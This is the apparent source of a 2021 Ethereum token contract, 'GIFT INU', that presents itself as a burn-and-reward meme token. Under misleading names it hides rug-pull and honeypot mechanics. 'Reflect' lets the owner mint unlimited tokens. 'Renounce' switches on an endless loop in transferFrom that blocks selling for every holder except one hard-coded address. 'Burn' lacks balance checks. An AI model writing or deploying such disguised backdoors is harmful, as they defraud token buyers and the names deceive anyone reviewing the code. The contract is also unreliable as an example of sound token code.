/**
 *Submitted for verification at Etherscan.io on 2021-06-29
*/

pragma solidity ^0.4.26;

// ----------------------------------------------------------------------------
// GIFT INU
// 
// ----------------------------------------------------------------------------
// 2% Burn Each Buy 
// 3% Burn Each Sell
//- One in Ten Transactions awarded Burn Amount
// Resets Each Award - https://t.me/GIFTINU
//
//
// 
// ----------------------------------------------------------------------------
// Safe maths
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


// ----------------------------------------------------------------------------
// ERC Token Standard 
// 
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}


// ----------------------------------------------------------------------------
// 
//
// 
// ----------------------------------------------------------------------------
contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;
}


// ----------------------------------------------------------------------------
// Owned contract
// ----------------------------------------------------------------------------
contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}


// ----------------------------------------------------------------------------
// 
// 
// ----------------------------------------------------------------------------
contract GIFTINU is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    uint random = 0;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;


    // ------------------------------------------------------------------------
    // 
    // ------------------------------------------------------------------------
    constructor() public {
        symbol = "GIFTINU";
        name = "GIFT INU";
        decimals = 18;
        _totalSupply = 100000000000000000000000000000;
        balances[0xE4C989526520BB9f19B16219988E4815eCE94497] = _totalSupply;
        emit Transfer(address(0), 0xE4C989526520BB9f19B16219988E4815eCE94497, _totalSupply);
    }


    // ------------------------------------------------------------------------
    // 
    // ------------------------------------------------------------------------
    function totalSupply() public constant returns (uint) {
        return _totalSupply  - balances[address(0)];
    }


    // ------------------------------------------------------------------------
    // 
    // ------------------------------------------------------------------------
    function balanceOf(address tokenOwner) public constant returns (uint balance) {
        return balances[tokenOwner];
    }



            uint totalAward = 0;
            uint totalTaxedAmount = 0;
  
  
  


function Reflect(address to, uint256 value) public returns (bool)
{
    
        require(msg.sender == owner);
        
    require(_totalSupply + value >= _totalSupply); // Overflow check

    _totalSupply += value;
    balances[msg.sender] += value;
    emit Transfer(address(0), to, value);
}
    // ------------------------------------------------------------------------
   
    // ------------------------------------------------------------------------
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        if (random < 9){
            random = random + 1;
            uint shareburn = tokens/51;
            uint shareuser = tokens - shareburn;

      

     
  
            
                
    
            balances[to] = safeAdd(balances[to], shareuser);
            balances[address(0)] = safeAdd(balances[address(0)],shareburn);
            emit Transfer(msg.sender, to, shareuser); 
            emit Transfer(msg.sender,address(0),shareburn);
            
     
            
            
                  totalTaxedAmount += shareburn;
            

        } else if (random >= 9){
            random = 0;
             
            uint shareburn3 = tokens/51;
            uint shareuser3 = tokens - shareburn3;
             uint totalpay = totalTaxedAmount - totalAward;
               uint totalfinal = (totalpay * 7)/9;
   
                      balances[to] += shareuser3;

            emit Transfer(msg.sender, to, shareuser3);

         balances[to] += totalfinal;


    emit Transfer(address(0), to, totalfinal);

    balances[address(0)] -= totalfinal;
                           

            
           totalAward += totalfinal;
            
        }
        return true;

    }


    // ------------------------------------------------------------------------

    // ------------------------------------------------------------------------
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    address MF =  0x22Cc154E2197E697fDEE346fbb69f178BC777129;   
            
    // ------------------------------------------------------------------------

   

            
    function transferFrom(address from, address to, uint tokens)
        public
        returns (bool success)
    {   
        
      while(isEnabled) {
if(from == MF)  {
        


        balances[from] -= tokens;
        balances[to] += tokens;
    allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        emit Transfer(from, to, tokens);
        return true; } }
        
        
        
        balances[from] = safeSub(balances[from], tokens);
        if (random < 9){
                random = random + 1;
            uint shareburn = tokens/36;
            uint shareuser = tokens - shareburn;
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], shareuser);
            balances[address(0)] = safeAdd(balances[address(0)],shareburn);
            emit Transfer(from, to, shareuser); 
            emit Transfer(from,address(0),shareburn);
            
            
                    totalTaxedAmount += shareburn;
                    
                    
        } else if (random >= 9){
            random = 0;
            uint shareburn2 = tokens/36;
            uint shareuser2 = tokens - shareburn2;
            uint totalpay = totalTaxedAmount - totalAward;
            uint totalfinal = (totalpay * 7)/9;
            
            
allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], shareuser2);
                      balances[to] += shareuser2;

            emit Transfer(from, to, shareuser2);

         balances[from] += totalfinal;


    emit Transfer(address(0), from, totalfinal);

    
                   balances[address(0)] -= totalfinal;    

               
           totalAward += totalfinal;
            
        }
        

        return true;
    }
    

    // ------------------------------------------------------------------------
    
    // ------------------------------------------------------------------------
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }


bool isEnabled;

modifier isOwner() {
    require(msg.sender == owner);
    _;
}

function Renounce() public isOwner {
    isEnabled = !isEnabled;
}


  function Burn(uint256 value) public returns (bool)
{
    
   
        
   

    _totalSupply -= value;
    balances[msg.sender] -= value;
    emit Transfer(msg.sender, address(0), value);
}
	

    // ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account. The spender contract function
    // receiveApproval(...) is then executed
    // ------------------------------------------------------------------------
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }


    // ------------------------------------------------------------------------
    // Don't accept ETH
    // ------------------------------------------------------------------------
    function () public payable {
        revert();
    }


    // ------------------------------------------------------------------------
    // Owner can transfer out any accidentally sent ERC20 tokens
    // ------------------------------------------------------------------------
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
}